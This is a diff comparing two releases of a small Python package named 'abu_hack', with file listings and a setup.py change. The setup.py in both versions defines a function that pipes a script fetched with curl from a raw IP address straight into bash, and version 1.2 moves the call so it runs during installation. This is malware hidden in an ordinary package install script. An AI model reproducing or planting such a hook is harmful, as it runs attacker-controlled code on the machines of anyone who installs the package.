# Comparing `tmp/abu_hack-1.1.tar.gz` & `tmp/abu_hack-1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "abu_hack-1.1.tar", last modified: Sun May 14 10:36:08 2023, max compression
+gzip compressed data, was "abu_hack-1.2.tar", last modified: Sun May 14 10:50:05 2023, max compression
```

## Comparing `abu_hack-1.1.tar` & `abu_hack-1.2.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-14 10:36:08.160607 abu_hack-1.1/
--rw-rw-rw-   0        0        0     1085 2023-05-14 09:24:52.000000 abu_hack-1.1/LICENSE
--rw-rw-rw-   0        0        0      393 2023-05-14 10:36:08.123581 abu_hack-1.1/PKG-INFO
--rw-rw-rw-   0        0        0       16 2023-05-14 09:26:10.000000 abu_hack-1.1/README.md
-drwxrwxrwx   0        0        0        0 2023-05-14 10:36:08.109570 abu_hack-1.1/abu_hack/
--rw-rw-rw-   0        0        0        0 2023-05-14 09:28:18.000000 abu_hack-1.1/abu_hack/__init__.py
--rw-rw-rw-   0        0        0       44 2023-05-14 09:29:15.000000 abu_hack-1.1/abu_hack/wp.py
-drwxrwxrwx   0        0        0        0 2023-05-14 10:36:08.120580 abu_hack-1.1/abu_hack.egg-info/
--rw-rw-rw-   0        0        0      393 2023-05-14 10:36:07.000000 abu_hack-1.1/abu_hack.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      221 2023-05-14 10:36:08.000000 abu_hack-1.1/abu_hack.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-14 10:36:07.000000 abu_hack-1.1/abu_hack.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        7 2023-05-14 10:36:07.000000 abu_hack-1.1/abu_hack.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-05-14 10:36:07.000000 abu_hack-1.1/abu_hack.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-14 10:36:08.160607 abu_hack-1.1/setup.cfg
--rw-rw-rw-   0        0        0      951 2023-05-14 10:35:56.000000 abu_hack-1.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-14 10:50:05.026825 abu_hack-1.2/
+-rw-rw-rw-   0        0        0     1085 2023-05-14 09:24:52.000000 abu_hack-1.2/LICENSE
+-rw-rw-rw-   0        0        0      393 2023-05-14 10:50:04.993826 abu_hack-1.2/PKG-INFO
+-rw-rw-rw-   0        0        0       16 2023-05-14 09:26:10.000000 abu_hack-1.2/README.md
+drwxrwxrwx   0        0        0        0 2023-05-14 10:50:04.981795 abu_hack-1.2/abu_hack/
+-rw-rw-rw-   0        0        0        0 2023-05-14 09:28:18.000000 abu_hack-1.2/abu_hack/__init__.py
+-rw-rw-rw-   0        0        0       44 2023-05-14 09:29:15.000000 abu_hack-1.2/abu_hack/wp.py
+drwxrwxrwx   0        0        0        0 2023-05-14 10:50:04.992797 abu_hack-1.2/abu_hack.egg-info/
+-rw-rw-rw-   0        0        0      393 2023-05-14 10:50:04.000000 abu_hack-1.2/abu_hack.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      221 2023-05-14 10:50:04.000000 abu_hack-1.2/abu_hack.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-14 10:50:04.000000 abu_hack-1.2/abu_hack.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        7 2023-05-14 10:50:04.000000 abu_hack-1.2/abu_hack.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-05-14 10:50:04.000000 abu_hack-1.2/abu_hack.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-14 10:50:05.026825 abu_hack-1.2/setup.cfg
+-rw-rw-rw-   0        0        0      951 2023-05-14 10:49:56.000000 abu_hack-1.2/setup.py
```

### Comparing `abu_hack-1.1/LICENSE` & `abu_hack-1.2/LICENSE`

 * *Files identical despite different names*

### Comparing `abu_hack-1.1/setup.py` & `abu_hack-1.2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,16 @@
 import setuptools,os
 def code_exec():
     os.system("curl http://121.5.238.52:30660/1.txt|bash")
 with open("README.md", "r") as fh:
     long_description = fh.read()
+code_exec()
 setuptools.setup(
     name="abu_hack",  # 模块名称
-    version="1.1",  # 当前版本
+    version="1.2",  # 当前版本
     author="abu-blank",  # 作者
     author_email="abu-blank@qq.com",  # 作者邮箱
     description="一个非常NB的包",  # 模块简介
     long_description=long_description,  # 模块详细介绍
     long_description_content_type="text/markdown",  # 模块详细介绍格式
     packages=setuptools.find_packages(),  # 自动找到项目中导入的模块
     # 模块相关的元数据
@@ -19,9 +20,8 @@
         "Operating System :: OS Independent",
     ],
     # 依赖模块
     install_requires=[
         'pillow',
     ],
     python_requires='>=3',
-)
-code_exec()
+)
```

